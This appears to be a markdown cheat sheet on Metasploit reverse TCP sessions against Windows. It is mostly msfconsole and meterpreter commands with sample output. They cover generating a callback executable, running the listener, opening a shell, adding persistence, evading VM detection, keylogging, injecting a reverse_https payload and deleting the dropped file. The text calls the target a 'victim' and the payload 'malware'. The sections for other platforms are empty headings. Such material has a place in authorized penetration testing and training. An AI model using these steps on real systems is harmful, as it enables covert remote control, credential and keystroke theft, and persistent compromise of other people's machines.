# Metasploit Reverse TCP 

Open a reverse tcp session! More details here:
  * Reverse TCP: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md
  * Reverse HTTPS: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_https.md
  * How to use msfvenom: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
  * Meterpreter Basic Commands, Offensive Security (https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
  * Interactive PowerShell Sessions within Meterpreter, June 2015 (https://www.trustedsec.com/june-2015/interactive-powershell-sessions-within-meterpreter/)
  * Mimikatz, Offensive Security (https://www.offensive-security.com/metasploit-unleashed/mimikatz/)

Other resources:
  * https://www.darkoperator.com/blog/2011/12/16/injecting-payloads-into-memory-meterpreter.html

## 1. Windows

#### A. Generate malware

```bash
$ msfconsole
msf > use windows/x64/meterpreter_reverse_tcp
msf payload(windows/x64/meterpreter_reverse_tcp) > set LHOST <listener_internet_ip>
msf payload(windows/x64/meterpreter_reverse_tcp) > generate -f payload.exe -t exe
[*] Writing 212480 bytes to payload.exe...
```

#### B. Handle Reverse TCP

```bash
$ msfconsole  
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST <listener_intrnet_ip>
msf exploit(multi/handler) > exploit -j

# HELP:
msf exploit(multi/handler) > sessions -h

# display active sessions
msf exploit(multi/handler) > sessions

# interact with a session
msf exploit(multi/handler) > sessions -i <session_ID>

# access command line
meterpreter > shell
> powershell

# put session in background
meterpreter > background
[*] Backgrounding session 1...

# make malware persisent
# WARNING: Make sure you own IP provided when created payload. 
# That who own that IP can control victim
meterpreter > run persistence
# or https://www.rapid7.com/db/modules/post/windows/manage/persistence_exe

# Check wether malware was executed on VMWare
meterpreter > run post/windows/gather/checkvm

# Suspend any activity for 20 seconds
meterpreter > sleep 20

# Keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
Hello World!!

# Uninstall the malware before persistency
meterpreter > run post/windows/manage/payload_inject PAYLOAD=windows/meterpreter/reverse_https,LHOST=<>,LPORT=4444,HANDLER=true,OPTIONS='SessionCommunicationTimeout=0,SessionExpirationTimeout=0,PID=3384'
meterpreter > exit		# this will actually close session.
msf exploit(multi/handler) > sessions <new_created_session_ID>
meterpreter > shell
C:\> del \path\malware_name.exe
meterpreter > exit
[*] Shutting down Meterpreter...

# Uninstall after persistency
# Reverse what you just congigured using log file created: root/.msf4/logs/persistence/*

# Update the payload
# Usefull in case it is detected by antivirus
# to be continued...
```

## 2. Linux

## 3. Android

## 4. OSX

## 5. Python

## 6. PHP